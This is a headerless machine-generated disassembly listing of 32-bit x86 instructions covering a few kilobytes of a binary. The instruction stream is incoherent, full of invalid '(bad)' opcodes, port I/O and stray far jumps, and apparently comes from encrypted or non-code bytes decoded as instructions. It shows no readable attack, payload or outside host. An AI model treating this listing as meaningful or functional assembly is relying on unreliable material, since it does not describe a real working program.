  4143dd:	pop    esp
  4143de:	pop    ds
  4143df:	add    BYTE PTR [ebx+0x1cf974e2],bh
  4143e5:	or     ch,BYTE PTR [ebx]
  4143e7:	cmc    
  4143e8:	xchg   ebp,eax
  4143e9:	addr16 mov ?,ecx
  4143ec:	popf   
  4143ed:	cdq    
  4143ee:	push   es
  4143ef:	adc    BYTE PTR [esi+0x4],bh
  4143f2:	mov    dh,0xc8
  4143f4:	les    eax,FWORD PTR [esi-0x29aa3b15]
  4143fa:	lea    esp,ds:[ebp+0x5e8b81da]
  414401:	xchg   esi,eax
  414402:	aaa    
  414403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414404:	sub    bl,BYTE PTR [esi+0x6ac45b1e]
  41440a:	sbb    eax,0xdfd41783
  41440f:	xchg   ebx,esi
  414411:	std    
  414412:	jae    0x4143f8
  414414:	push   ecx
  414415:	fild   WORD PTR [esi-0x3d]
  414418:	jecxz  0x4143cf
  41441a:	ja     0x41444e
  41441c:	out    dx,al
  41441d:	push   ecx
  41441f:	dec    edx
  414420:	lock sar edx,1
  414423:	out    0x43,eax
  414425:	jns    0x4143f5
  414427:	push   0x94c65fac
  41442c:	loopne 0x414473
  41442e:	aad    0xf6
  414430:	jl     0x41447c
  414432:	or     al,0x7c
  414434:	push   cs
  414435:	pop    ebp
  414436:	test   edi,ebx
  414438:	lods   eax,DWORD PTR ds:[esi]
  414439:	and    ebx,DWORD PTR [ebp+0x32]
  41443c:	push   eax
  41443d:	dec    edi
  41443e:	fs cld 
  414440:	add    cl,BYTE PTR [eax+0x583c2786]
  414446:	mov    ch,0xe6
  414448:	fisttp WORD PTR [esi-0x713cc57b]
  41444e:	or     ebp,0x46
  414451:	mov    ds:0x4b7445ca,al
  414456:	sbb    al,0xb8
  414458:	cmp    al,0xcf
  41445a:	mov    bh,0x3e
  41445c:	clc    
  41445d:	outs   dx,BYTE PTR ds:[esi]
  41445e:	pop    ebp
  41445f:	leave  
  414460:	and    eax,0x7b6ddcef
  414465:	in     al,0xbc
  414467:	xchg   ebp,eax
  414468:	cmp    al,0x85
  41446b:	nop
  41446c:	(bad)  
  41446e:	sub    al,0xdb
  414470:	retf   0xd9b7
  414473:	cli    
  414474:	adc    al,0xe1
  414476:	pop    eax
  414477:	or     eax,0x5301c130
  41447c:	push   esi
  41447d:	sbb    al,BYTE PTR [edi-0x2ae74087]
  414483:	mov    ebx,0xb9515a99
  414488:	inc    edi
  414489:	push   DWORD PTR [eax]
  41448b:	ror    DWORD PTR [ebx],1
  41448d:	sti    
  41448e:	pop    es
  41448f:	cmp    DWORD PTR [ebx-0x79],edi
  414492:	shl    DWORD PTR [ecx-0x23001752],1
  414498:	dec    esi
  414499:	jmp    edi
  41449b:	jae    0x414444
  41449d:	jmp    FWORD PTR [edx+0x5f]
  4144a0:	xchg   ebx,eax
  4144a1:	hlt    
  4144a2:	sbb    al,0xe2
  4144a4:	rcl    DWORD PTR [eax-0x27b0e375],1
  4144aa:	sub    ch,BYTE PTR [esi-0x5c435ce0]
  4144b0:	mov    cl,BYTE PTR [ebx]
  4144b2:	jg     0x4144a4
  4144b4:	sbb    al,0x55
  4144b6:	dec    edx
  4144b7:	shl    DWORD PTR [esi],0x4c
  4144ba:	mov    ebx,DWORD PTR fs:[ebx+0x7e]
  4144be:	cmp    al,0x1a
  4144c0:	push   es
  4144c1:	ins    BYTE PTR es:[edi],dx
  4144c2:	mov    bl,0x64
  4144c4:	in     al,0xdb
  4144c6:	xor    eax,0x2747bbfe
  4144cb:	ficom  WORD PTR [edi]
  4144cd:	fiadd  DWORD PTR [edx+0x5e6fb308]
  4144d3:	jns    0x414501
  4144d5:	call   0x74ef819d
  4144da:	pop    ebx
  4144db:	push   ebp
  4144dc:	inc    ebx
  4144dd:	data16 out dx,al
  4144df:	sub    al,0x8e
  4144e1:	leave  
  4144e2:	mov    ebp,0xa0734eaf
  4144e7:	inc    ebp
  4144e8:	ins    DWORD PTR es:[edi],dx
  4144e9:	jp     0x414505
  4144eb:	scas   al,BYTE PTR es:[edi]
  4144ec:	out    0x48,eax
  4144ee:	push   edx
  4144ef:	in     eax,dx
  4144f0:	inc    edx
  4144f1:	mov    ebp,DWORD PTR [ebp+0x4d]
  4144f4:	push   esi
  4144f5:	cld    
  4144f6:	sub    DWORD PTR [ebx-0x19],ebp
  4144f9:	lods   eax,DWORD PTR ds:[esi]
  4144fa:	ja     0x414548
  4144fc:	sub    BYTE PTR [edx+0x6c2d460],dh
  414502:	cwde   
  414503:	lds    ecx,FWORD PTR [eax+0x45]
  414506:	pusha  
  414507:	inc    eax
  414508:	jbe    0x414498
  41450a:	aad    0xd3
  41450c:	gs ss push ebp
  41450f:	mov    al,0x3e
  414511:	je     0x414558
  414513:	(bad)  
  414514:	fldenv [esi]
  414516:	in     eax,dx
  414517:	inc    eax
  414518:	or     BYTE PTR [ecx],dh
  41451a:	lds    ebp,FWORD PTR [ebx+esi*8-0x3209a709]
  414521:	dec    ecx
  414522:	stos   DWORD PTR es:[edi],eax
  414523:	mov    ds:0x484b2883,al
  414528:	sbb    al,0xb
  41452a:	mov    bl,BYTE PTR [edx+0x46]
  41452d:	push   eax
  41452e:	bound  ebx,QWORD PTR [edx-0x5c39722f]
  414534:	add    ebx,0x4e
  414537:	jae    0x76b44317
  41453d:	cs push eax
  41453f:	popf   
  414540:	xchg   BYTE PTR [edi+ebx*1-0x27],bh
  414544:	imul   esp,ebp,0x135ab41e
  41454a:	fidivr WORD PTR [edx+eiz*2+0x33]
  41454e:	push   0x14
  414550:	push   ss
  414551:	push   ss
  414552:	arpl   WORD PTR [eax+0x21],ax
  414555:	xchg   DWORD PTR [edx-0x50b8b119],edi
  41455b:	jp     0x414525
  41455d:	(bad)  
  41455e:	push   ss
  41455f:	jmp    0x4145c5
  414561:	mov    eax,0x94a31924
  414566:	lock pop ebx
  414568:	push   ebp
  414569:	push   ds
  41456a:	sbb    ch,bh
  41456c:	mov    WORD PTR [esi+0x62],cs
  41456f:	mov    ecx,0x4ba85070
  414574:	shl    BYTE PTR ds:0xc2a10bb0,cl
  41457a:	mov    WORD PTR [ecx],?
  41457c:	cdq    
  41457d:	cmc    
  41457e:	jp     0x4145e4
  414580:	mov    esp,0x450cc1a
  414585:	pushf  
  414586:	shr    DWORD PTR [edi-0x53],cl
  414589:	and    al,0x6e
  41458b:	jae    0x4145be
  41458d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41458e:	jae    0x414536
  414590:	inc    edi
  414591:	hlt    
  414592:	dec    edx
  414593:	cmp    BYTE PTR [ebp-0x17],al
  414596:	test   BYTE PTR [eax-0x6c],ch
  414599:	(bad)  
  41459a:	in     al,0x60
  41459c:	out    0xeb,al
  41459e:	pop    ss
  41459f:	or     al,0xed
  4145a1:	pop    esi
  4145a2:	idiv   bl
  4145a4:	sub    eax,0x5ffee04f
  4145a9:	push   ecx
  4145aa:	inc    edx
  4145ab:	ins    DWORD PTR es:[edi],dx
  4145ac:	lock push edi
  4145ae:	push   ss
  4145af:	and    al,0x88
  4145b1:	scas   al,BYTE PTR es:[edi]
  4145b2:	ins    DWORD PTR es:[edi],dx
  4145b3:	xchg   esi,eax
  4145b4:	inc    edx
  4145b5:	test   eax,0x6a2a5721
  4145ba:	fs pop edi
  4145bc:	push   esi
  4145bd:	ret    
  4145be:	arpl   WORD PTR [edi+ebp*2-0x27],bx
  4145c2:	xchg   esp,eax
  4145c3:	(bad)  
  4145c4:	(bad)  
  4145c5:	out    0xf5,eax
  4145c7:	pusha  
  4145c8:	cdq    
  4145c9:	shr    DWORD PTR [esi],cl
  4145cb:	push   ecx
  4145cc:	ja     0x41461c
  4145ce:	fisubr DWORD PTR [ecx]
  4145d0:	xor    eax,0x96af5a1a
  4145d5:	push   ds
  4145d6:	imul   ecx,DWORD PTR [ecx],0xfb028bb0
  4145dc:	in     eax,dx
  4145dd:	jecxz  0x4145e2
  4145df:	and    bl,BYTE PTR [ebp-0x68]
  4145e2:	cmc    
  4145e3:	and    eax,0xdb5732ef
  4145e8:	dec    eax
  4145e9:	mov    cl,0x39
  4145eb:	fbld   TBYTE PTR [edi+0x3ccda7c]
  4145f1:	stos   BYTE PTR es:[edi],al
  4145f2:	imul   edi,ecx,0x579a04bd
  4145f8:	xor    eax,0x794e4d85
  4145fd:	push   0x28a5aa5b
  414602:	fdivr  DWORD PTR [eax+0x6e21527b]
  414608:	dec    esi
  414609:	in     al,dx
  41460a:	adc    BYTE PTR [ebx-0x12],dl
  41460d:	inc    esp
  41460e:	adc    al,0xf4
  414610:	aam    0x7b
  414612:	xchg   DWORD PTR [ebx+0x4a21f874],ebp
  414618:	adc    eax,0x6dc71641
  41461d:	cmp    edi,DWORD PTR [ebx]
  41461f:	les    edx,FWORD PTR [edi-0x48]
  414622:	or     edx,ebp
  414624:	fstp   DWORD PTR [ebx]
  414626:	dec    edx
  414627:	ret    
  414628:	in     eax,dx
  414629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41462a:	pop    eax
  41462b:	lock es add bl,dh
  41462f:	imul   esi,esi,0xffffff97
  414632:	lds    ecx,FWORD PTR [eax+0x3a]
  414635:	popa   
  414636:	fcom   DWORD PTR [edi]
  414638:	xchg   ebx,eax
  414639:	add    BYTE PTR [esi+0xa6d18b1],al
  41463f:	xlat   BYTE PTR ds:[ebx]
  414640:	push   0x7c05813b
  414645:	mov    al,0xeb
  414647:	(bad)  
  414648:	mov    al,ds:0x8efbf9bc
  41464d:	mov    cl,0x43
  41464f:	imul   ebx,DWORD PTR [edi-0x73],0x14
  414653:	xor    eax,edx
  414655:	mov    al,ds:0xacfd93a8
  41465a:	in     al,0xc9
  41465c:	repnz ficomp WORD PTR gs:0xcf70d984
  414664:	mov    DWORD PTR [ecx+0x4c704116],edx
  41466a:	outs   dx,DWORD PTR ds:[esi]
  41466b:	scas   eax,DWORD PTR es:[edi]
  41466c:	xchg   edi,eax
  41466d:	shr    DWORD PTR [eax-0x1a569dbe],0x6c
  414674:	xor    al,0x1a
  414676:	int3   
  414677:	mov    fs,WORD PTR [ecx+eiz*4-0x6f501a3e]
  41467e:	cmp    al,0xf5
  414680:	cmp    al,0x80
  414682:	mov    esp,0xfacf6e29
  414687:	pop    ebp
  414688:	inc    esp
  414689:	repnz cli 
  41468b:	push   edx
  41468c:	fimul  DWORD PTR [ebx+0x60]
  41468f:	icebp  
  414690:	push   esp
  414691:	sub    DWORD PTR [eax-0x5a31a686],edx
  414697:	aas    
  414698:	add    BYTE PTR [ebx],dh
  41469a:	jge    0x4146fa
  41469c:	cmp    al,0x6f
  41469e:	cmc    
  41469f:	mov    bl,0x37
  4146a1:	mov    ah,0xfd
  4146a3:	xchg   esi,eax
  4146a4:	pushf  
  4146a5:	dec    ebx
  4146a6:	dec    edx
  4146a7:	shr    DWORD PTR [edx+0x0],0x1e
  4146ab:	adc    eax,0xed70e5c9
  4146b0:	jle    0x414641
  4146b2:	mov    ds:0x299b4eb0,eax
  4146b7:	repz cmp cl,BYTE PTR [esi]
  4146ba:	imul   eax,edi,0xffffffaf
  4146bd:	pop    es
  4146be:	jns    0x414683
  4146c0:	xor    ebp,DWORD PTR [eax-0x79]
  4146c3:	sub    dh,ah
  4146c5:	adc    DWORD PTR [ebp+0x62],0x139c0dab
  4146cc:	add    BYTE PTR [edi-0x3950695e],bh
  4146d2:	in     eax,dx
  4146d3:	cwde   
  4146d4:	xchg   ecx,eax
  4146d5:	dec    edx
  4146d6:	mov    ch,0xc9
  4146d8:	ror    eax,cl
  4146da:	push   0xfffffff6
  4146dc:	ret    
  4146dd:	add    DWORD PTR ss:[eax-0x136512e9],esi
  4146e4:	ret    
  4146e5:	hlt    
  4146e6:	adc    al,0x98
  4146e8:	mov    ds:0xc773af57,eax
  4146ed:	dec    ebp
  4146ee:	dec    esp
  4146ef:	ror    DWORD PTR [eax+0x305843ad],cl
  4146f5:	sbb    dl,bl
  4146f7:	mov    al,0x98
  4146f9:	es das 
  4146fb:	inc    esi
  4146fc:	add    BYTE PTR ds:[edi+0x2],bl
  414700:	pop    ecx
  414701:	js     0x414736
  414703:	into   
  414704:	lds    ebx,FWORD PTR [ebx+ebx*4]
  414707:	cwde   
  414708:	inc    ebx
  414709:	inc    ebx
  41470a:	imul   ebp,DWORD PTR [eax-0x48],0x7cc988d7
  414711:	(bad)  
  414712:	or     al,dl
  414714:	ss std 
  414716:	(bad)  
  414717:	cmp    al,0xa3
  414719:	jbe    0x414787
  41471b:	xchg   DWORD PTR [edi-0x65453e74],ebx
  414721:	push   ss
  414722:	xor    esi,0x65
  414725:	xchg   ebp,eax
  414726:	ffreep st(5)
  414728:	in     eax,0x93
  41472a:	and    al,0x48
  41472c:	std    
  41472d:	aas    
  41472e:	xchg   ebp,eax
  41472f:	cmp    bl,BYTE PTR [esi+0x41]
  414732:	sbb    eax,0x876b7cc4
  414737:	push   esi
  414738:	(bad)  ds:[eax+0x7e]
  41473c:	mov    edi,ebx
  41473e:	fcom   DWORD PTR [ecx+0x6a1fea3d]
  414744:	and    eax,0x7645e796
  414749:	mov    ecx,0xb9c6100d
  41474e:	mov    ?,ebx
  414750:	mov    es,WORD PTR [esi-0x59b21dd6]
  414756:	repz ret 0x570e
  41475a:	mov    ds:0x3cda427a,eax
  41475f:	push   0xc838f731
  414764:	sti    
  414765:	xchg   edi,eax
  414766:	mov    ?,esi
  414768:	es fs bt eax,edx
  41476d:	push   esi
  41476e:	push   0xffffffe2
  414770:	cmp    al,0x5e
  414772:	xchg   edx,eax
  414773:	cld    
  414774:	mov    al,cl
  414776:	dec    edx
  414777:	inc    eax
  414778:	adc    esi,DWORD PTR [ecx+0x6b]
  41477b:	fucomp st(7)
  41477d:	inc    eax
  41477e:	and    eax,0x7a9c5020
  414783:	ss inc ecx
  414785:	in     eax,0x96
  414787:	pop    ecx
  414788:	jmp    DWORD PTR [ebx]
  41478a:	sub    eax,0x4042768f
  41478f:	inc    eax
  414790:	push   esp
  414791:	push   ss
  414792:	gs mov esp,0xcd201a1d
  414798:	cmp    BYTE PTR [ebp+0x68c348ff],ch
  41479e:	xchg   esi,eax
  41479f:	jns    0x4147da
  4147a1:	mov    eax,0x1fdd5c92
  4147a6:	dec    edi
  4147a7:	jg     0x4147da
  4147a9:	aas    
  4147aa:	mov    BYTE PTR [ecx],dh
  4147ac:	ror    BYTE PTR [esi+0x744dd5cd],1
  4147b2:	mov    edi,0x9bccd094
  4147b7:	outs   dx,DWORD PTR ds:[esi]
  4147b8:	clc    
  4147b9:	std    
  4147ba:	mov    ds:0x9f15145f,al
  4147bf:	fwait
  4147c0:	push   edi
  4147c1:	inc    ecx
  4147c2:	test   BYTE PTR [ecx-0x61],bl
  4147c5:	ins    BYTE PTR es:[edi],dx
  4147c6:	xchg   DWORD PTR [ecx+0x25],edx
  4147c9:	lock mov BYTE PTR [ecx+ecx*4-0x7b427d2e],dh
  4147d1:	add    BYTE PTR [esi-0x77],0xd9
  4147d5:	push   0xfffffff8
  4147d7:	ins    DWORD PTR es:[edi],dx
  4147d8:	and    BYTE PTR [esi+0x6b960c5c],0x32
  4147df:	xor    DWORD PTR [edi+0x4f],ebp
  4147e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e3:	or     al,0x7
  4147e5:	dec    ebx
  4147e6:	sub    ah,bh
  4147e8:	inc    edx
  4147e9:	mov    ebx,0x8600d113
  4147ee:	sub    dh,bh
  4147f0:	shl    BYTE PTR [ecx],cl
  4147f2:	dec    edi
  4147f3:	fstp   QWORD PTR [edx-0x6f]
  4147f6:	(bad)  
  4147f7:	loopne 0x414875
  4147f9:	js     0x414871
  4147fb:	dec    ebp
  4147fc:	int    0xb5
  4147fe:	mov    ecx,0xc2df3388
  414803:	xor    al,0x1d
  414805:	mov    ds:0xd7e7beb2,eax
  41480a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41480b:	test   al,0x80
  41480d:	fild   WORD PTR [eax]
  41480f:	js     0x41479a
  414811:	gs in  eax,0x1f
  414814:	(bad)  
  414815:	jo     0x4147e1
  414817:	ror    BYTE PTR [ebx],1
  414819:	mov    DWORD PTR [edx+0x616c60f0],ebx
  41481f:	xchg   edi,eax
  414820:	cmp    ah,BYTE PTR [esi-0x68]
  414823:	mov    ebx,0x17f7fcc3
  414828:	cli    
  414829:	lods   eax,DWORD PTR es:[esi]
  41482b:	add    eax,0x143e2aa2
  414830:	loope  0x41484f
  414832:	jo     0x4147f9
  414834:	loope  0x414854
  414836:	mov    ds:0xff3f3d6f,eax
  41483b:	jbe    0x4147c2
  41483d:	mov    dh,0xd0
  41483f:	in     al,0x55
  414841:	lods   al,BYTE PTR ds:[esi]
  414842:	int    0x45
  414844:	je     0x4148b9
  414846:	mov    eax,0x582ddbc5
  41484b:	repz fist DWORD PTR [ebp-0x50742c75]
  414852:	jno    0x4147e7
  414854:	sbb    al,0x54
  414856:	mov    al,ds:0x476d5f60
  41485b:	mov    bh,0x2c
  41485d:	push   ds
  41485e:	dec    edx
  41485f:	mov    eax,ds:0x2083114f
  414864:	lea    ebx,[esp+ebp*4-0x6d]
  414868:	sub    bh,BYTE PTR [edi+0x43]
  41486b:	jns    0x41485b
  41486d:	pop    edi
  41486e:	stos   BYTE PTR es:[edi],al
  41486f:	(bad)
  414872:	push   ss
  414873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414874:	nop
  414875:	push   eax
  414876:	leave  
  414877:	aam    0x37
  414879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41487a:	test   al,0x5e
  41487c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41487d:	addr16 xchg ebx,eax
  41487f:	icebp  
  414880:	push   edi
  414881:	adc    al,0xfc
  414883:	(bad)  
  414884:	xchg   edi,eax
  414885:	lock into 
  414887:	jo     0x414816
  414889:	fstp   DWORD PTR [eax]
  41488b:	xchg   ebp,esi
  41488d:	adc    DWORD PTR [edx],edi
  41488f:	jle    0x414880
  414891:	xor    ebp,edx
  414893:	repz or al,0x9f
  414896:	xchg   DWORD PTR [ebp-0x69d75c03],esp
  41489c:	fs (bad) 
  41489e:	test   DWORD PTR [esi],esp
  4148a0:	and    al,ch
  4148a2:	xor    al,0x66
  4148a4:	pop    ebx
  4148a5:	jmp    0x4148fc
  4148a7:	and    BYTE PTR [esi-0x24ba0ee5],cl
  4148ad:	sub    eax,0x92fe8d5c
  4148b2:	in     eax,0x6d
  4148b4:	jo     0x4148e8
  4148b6:	push   eax
  4148b7:	add    eax,eax
  4148b9:	in     eax,0x5e
  4148bb:	iret   
  4148bc:	jbe    0x4148a9
  4148be:	xor    BYTE PTR [esi-0x45e654c6],0x75
  4148c5:	(bad)  
  4148c7:	pop    es
  4148c8:	test   BYTE PTR [eax],al
  4148ca:	frstor [eax-0x5b]
  4148cd:	shl    BYTE PTR [ecx+eiz*8-0x57e761f8],cl
  4148d4:	(bad)  
  4148d5:	imul   dl
  4148d7:	mov    ebp,0xd37751b8
  4148dc:	mov    bh,0xd2
  4148de:	jmp    0x5157:0x2a2babf1
  4148e5:	and    eax,ebx
  4148e7:	ins    DWORD PTR es:[edi],dx
  4148e8:	or     edi,DWORD PTR [ebx+0x2e32ac6c]
  4148ee:	ret    0x11b5
  4148f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f2:	cli    
  4148f3:	ficom  WORD PTR [esp+ebx*1]
  4148f6:	out    0xc9,eax
  4148f8:	pusha  
  4148f9:	xchg   edi,eax
  4148fa:	sub    BYTE PTR [edx-0x41e4314c],0x6b
  414901:	scas   eax,DWORD PTR es:[edi]
  414902:	into   
  414903:	xchg   ecx,eax
  414904:	and    DWORD PTR [ebx-0x23f60b37],0x2fd7dbc5
  41490e:	fmul   QWORD PTR [eax]
  414910:	jge    0x414945
  414912:	pop    ecx
  414913:	stc    
  414914:	mov    ds:0xb2c946fc,al
  414919:	or     eax,0x356a6b6e
  41491e:	add    esp,DWORD PTR [edi+esi*2]
  414921:	and    BYTE PTR [ecx-0x26],0x9c
  414925:	(bad)  
  414926:	pushf  
  414927:	mov    ecx,0xe6750c09
  41492c:	sbb    DWORD PTR ds:0x9b078bcb,eax
  414932:	iret   
  414933:	mov    ds:0x98be69e5,eax
  414938:	xchg   ebx,eax
  414939:	jp     0x41497d
  41493b:	add    dl,bl
  41493d:	mov    cl,0x5b
  41493f:	sbb    ah,BYTE PTR cs:[eax]
  414942:	in     eax,0xfa
  414944:	sub    al,0xa2
  414946:	loope  0x4148d8
  414948:	or     DWORD PTR [edi-0x27],0x96cc609b
  41494f:	inc    esi
  414950:	and    DWORD PTR [eax-0x14],esp
  414953:	lods   al,BYTE PTR ds:[esi]
  414954:	push   esi
  414955:	aaa    
  414956:	dec    DWORD PTR [edx+edx*2+0x5e]
  41495a:	sti    
  41495b:	jecxz  0x41490a
  41495d:	std    
  41495e:	ss arpl ax,cx
  414961:	and    eax,0x367a4c32
  414966:	add    ebp,DWORD PTR [esi+0x3b250c53]
  41496c:	rcr    DWORD PTR [ecx-0x405a974d],cl
  414972:	es pop esp
  414974:	retf   
  414975:	test   eax,0xa9f32d54
  41497a:	push   ecx
  41497b:	cmp    ebx,DWORD PTR [ebx]
  41497d:	mov    eax,ds:0xd5076406
  414982:	pop    esp
  414983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414984:	repnz and al,0x14
  414987:	adc    BYTE PTR [esi+0x4a],bh
  41498a:	push   0xffffff8f
  41498c:	jbe    0x41492d
  41498e:	aas    
  41498f:	sub    BYTE PTR [edx],cl
  414991:	mov    dl,0xe4
  414993:	cs sub al,0xba
  414996:	fist   DWORD PTR [ebx]
  414998:	aas    
  414999:	shl    DWORD PTR [ebx-0xa4faea],0xa
  4149a0:	mov    al,ds:0xad6cf7a2
  4149a5:	mov    BYTE PTR [edi-0x3f78f31d],dl
  4149ab:	sbb    DWORD PTR fs:[edx*1+0x1e426e2f],ebp
  4149b3:	rcr    BYTE PTR [ebx-0x20e6ecb0],0x6
  4149ba:	mov    ecx,0xf074f47c
  4149bf:	dec    ebx
  4149c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c1:	and    esi,DWORD PTR [edx-0x6b95d668]
  4149c7:	cwde   
  4149c8:	pop    edx
  4149c9:	cmc    
  4149ca:	ins    BYTE PTR es:[edi],dx
  4149cb:	ss leave 
  4149cd:	stos   BYTE PTR es:[edi],al
  4149ce:	and    DWORD PTR [ebx],edx
  4149d0:	jmp    0x6f8e:0x9e35a8be
  4149d7:	sbb    BYTE PTR [edi],bh
  4149d9:	scas   eax,DWORD PTR es:[edi]
  4149da:	aas    
  4149db:	cmp    al,0xe8
  4149dd:	sub    ecx,DWORD PTR [edi]
  4149df:	xor    dl,ch
  4149e1:	mov    ds:0xddcc6a12,eax
  4149e6:	cmp    ebp,DWORD PTR [ebx]
  4149e8:	fld    DWORD PTR ds:0xd25b1fa4
  4149ee:	add    eax,0xc058abae
  4149f3:	jmp    0x7cef:0x7c27ad9
  4149fa:	mov    ah,0x6e
  4149fc:	cmc    
  4149fd:	aam    0x93
  4149ff:	call   0xb4e8:0x5db23fa4
  414a06:	xor    BYTE PTR [esi],ah
  414a08:	inc    eax
  414a09:	jl     0x414a09
  414a0b:	aas    
  414a0c:	pop    ebx
  414a0d:	ins    BYTE PTR es:[edi],dx
  414a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0f:	push   cs
  414a10:	jne    0x414a83
  414a12:	fcom   DWORD PTR [eiz*4+0x10d53367]
  414a19:	data16 mov ?,WORD PTR [ebp-0xa349abc]
  414a20:	add    al,0x4d
  414a22:	mov    cs,WORD PTR [ebx+0xc97e1ef]
  414a28:	cmp    eax,0x776f5510
  414a2d:	je     0x414a0f
  414a2f:	jo     0x414a91
  414a31:	cld    
  414a32:	push   cs
  414a33:	int3   
  414a34:	dec    edx
  414a35:	loope  0x414a9a
  414a37:	pop    esp
  414a38:	and    eax,0x681dda16
  414a3d:	push   ebx
  414a3e:	pop    ebp
  414a3f:	xchg   DWORD PTR [ebx],ebx
  414a41:	cmp    ebx,DWORD PTR [edx-0xc]
  414a44:	ss push ecx
  414a46:	aas    
  414a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a48:	neg    BYTE PTR [edi]
  414a4a:	mov    dl,0x40
  414a4c:	data16 cmp al,0xf1
  414a4f:	add    eax,0x87519a29
  414a54:	ror    DWORD PTR [edi-0x2b],0xaa
  414a58:	adc    esp,ebx
  414a5a:	loop   0x414abe
  414a5c:	fwait
  414a5d:	push   es
  414a5e:	xor    ebp,DWORD PTR [edi]
  414a60:	test   DWORD PTR [ebx+0x5b],esp
  414a63:	mov    ah,0x68
  414a65:	pop    ebp
  414a66:	xchg   esp,eax
  414a67:	sub    al,0xa5
  414a69:	test   al,0x53
  414a6b:	xchg   DWORD PTR [ebp-0x12],edx
  414a6e:	jg     0x4149fa
  414a70:	imul   ebx
  414a72:	out    dx,eax
  414a73:	jno    0x414ad3
  414a75:	in     al,0x16
  414a77:	popa   
  414a78:	ins    DWORD PTR es:[edi],dx
  414a79:	lds    ecx,FWORD PTR [ebp+esi*8-0x75]
  414a7d:	cdq    
  414a7e:	cli    
  414a7f:	loope  0x414ab8
  414a81:	ins    BYTE PTR es:[edi],dx
  414a82:	outs   dx,BYTE PTR ds:[esi]
  414a83:	adc    al,0x26
  414a85:	adc    ecx,DWORD PTR [ecx+0x0]
  414a88:	bound  edi,QWORD PTR [eax-0xc177d3c]
  414a8e:	out    dx,al
  414a8f:	jae    0x414aef
  414a91:	cmp    al,0xa1
  414a93:	(bad)
  414a96:	xchg   ebp,eax
  414a97:	fisttp WORD PTR [edx-0x5d]
  414a9a:	ds in  eax,0x39
  414a9d:	cdq    
  414a9e:	loopne 0x414a7c
  414aa0:	mov    ?,WORD PTR [edx+0x73e31d1e]
  414aa6:	mov    edx,0xca1e96d3
  414aab:	xchg   edx,eax
  414aac:	rol    BYTE PTR ds:0xb633d5cf,1
  414ab2:	xchg   edi,eax
  414ab3:	int    0xea
  414ab5:	mov    cl,BYTE PTR ds:0xb27dab20
  414abb:	test   BYTE PTR [eax-0x27799150],0x98
  414ac2:	pop    ds
  414ac3:	jae    0x414ade
  414ac5:	or     ah,ah
  414ac7:	ret    0xbe6
  414aca:	mov    dh,BYTE PTR [ecx+0x6b]
  414acd:	adc    al,0x97
  414acf:	mov    ebx,0x33de0369
  414ad4:	(bad)  
  414ad5:	mov    WORD PTR [eax-0x42],ds
  414ad8:	jmp    0xff3c:0x93dba962
  414adf:	pop    esi
  414ae0:	inc    ebx
  414ae1:	popf   
  414ae2:	stos   DWORD PTR es:[edi],eax
  414ae3:	shl    DWORD PTR [ecx-0x69],0x71
  414ae7:	int    0xc5
  414ae9:	je     0x414b17
  414aeb:	fisubr DWORD PTR [ebp+0x5]
  414aee:	mov    bl,0x7d
  414af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af1:	jae    0x414a90
  414af3:	mov    al,0x3f
  414af5:	and    ch,cl
  414af7:	mov    dh,0xb1
  414af9:	add    al,0x4f
  414afb:	test   esi,eax
  414afd:	cli    
  414afe:	lock xchg ebx,eax
  414b00:	add    DWORD PTR [ebx-0x54b50bd3],ebx
  414b06:	ins    DWORD PTR es:[edi],dx
  414b07:	scas   al,BYTE PTR es:[edi]
  414b08:	test   al,0x77
  414b0a:	cdq    
  414b0b:	lea    ecx,[ecx-0x4]
  414b0e:	iret   
  414b0f:	ja     0x414af6
  414b11:	jbe    0x414b8e
  414b13:	and    edi,DWORD PTR [edi+0x4b]
  414b16:	adc    al,0xba
  414b18:	mov    bl,0x46
  414b1a:	inc    edi
  414b1b:	adc    DWORD PTR [ecx],0x580c840
  414b21:	pop    esp
  414b22:	inc    edi
  414b23:	into   
  414b24:	cdq    
  414b25:	pop    ds
  414b26:	icebp  
  414b27:	imul   esi,DWORD PTR [edi-0x66],0xffffff9c
  414b2b:	mov    esp,0x83a165be
  414b30:	fiadd  DWORD PTR [ebx]
  414b32:	ins    BYTE PTR es:[edi],dx
  414b33:	push   esi
  414b34:	fwait
  414b35:	vpsrld xmm5,xmm2,XMMWORD PTR [edi+0x51]
  414b3a:	cmc    
  414b3b:	call   0xf7a5f841
  414b40:	mov    dh,0xe0
  414b42:	popa   
  414b43:	out    dx,al
  414b44:	clc    
  414b45:	adc    eax,0xd5b7d667
  414b4a:	std    
  414b4b:	stos   BYTE PTR es:[edi],al
  414b4c:	mov    bl,0x77
  414b4e:	stos   BYTE PTR es:[edi],al
  414b4f:	mov    al,ds:0xbea9bbd3
  414b54:	adc    BYTE PTR [esi],bl
  414b56:	pop    esi
  414b57:	(bad)  
  414b58:	(bad)  [ebp+0x6b18dc7]
  414b5e:	iret   
  414b5f:	mov    dl,BYTE PTR [ecx-0x53a91df9]
  414b65:	sbb    DWORD PTR [edi-0x1e],0x2
  414b69:	jno    0x414af8
  414b6b:	scas   eax,DWORD PTR es:[edi]
  414b6c:	mov    edi,0xe45a8638
  414b71:	xlat   BYTE PTR ds:[ebx]
  414b72:	sub    BYTE PTR [ebx+0x6f],bh
  414b75:	mov    ebp,0xde908c72
  414b7a:	mov    esi,0xa02b7046
  414b7f:	jbe    0x414bd5
  414b81:	push   ebx
  414b82:	adc    bl,dl
  414b84:	xchg   edi,eax
  414b85:	jmp    0xacef:0x3a50421b
  414b8c:	dec    esp
  414b8d:	mov    dh,dl
  414b8f:	fldcw  WORD PTR [ebx]
  414b91:	loope  0x414c11
  414b93:	and    DWORD PTR ds:[edi],edi
  414b96:	hlt    
  414b97:	imul   edx,esp,0x2a
